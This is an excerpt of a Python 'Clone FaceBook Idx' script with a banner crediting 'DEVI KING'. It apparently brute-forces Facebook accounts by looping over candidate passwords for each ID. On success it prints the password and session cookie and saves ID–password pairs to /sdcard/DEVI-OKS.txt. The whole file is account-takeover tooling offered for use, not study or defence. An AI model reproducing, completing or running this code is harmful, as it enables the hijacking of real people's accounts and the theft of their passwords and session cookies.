...
\x1b[38;5;88m |_____/ \___| \_/ |_|   💔                                                              
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m💔MADE BY\x1b[38;5;222m➤  \x1b[38;5;78m DEVI KING
\x1b[38;5;79m💔FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m DEVI ONFIRE ☠ 🚩 
\x1b[38;5;115m💔FACEBOOK ID  \x1b[38;5;222m➤   \x1b[38;5;115mhttps://www.facebook.com/profile.php?id=61553924229187
...
def main():
    ...
    print(f'\x1b[38;5;155m➤  [1] 𝐂𝐥𝐨𝐧𝐞 𝐅𝐚𝐜𝐞𝐁𝐨𝐨𝐤 𝐈𝐝𝐱')
    print(f'\x1b[38;5;155m➤  [2] 𝐎𝐟𝐟 𝐓𝐨𝐨𝐥 ');linex()
    t=input('\x1b[38;5;155m[➤] Choise One Option : ')
    if t in ["1","01"]:
        bhoot()    
    if t in ["2","02"]:
        os.system('exit')
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] DEVI  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[DEVI-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/DEVI-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
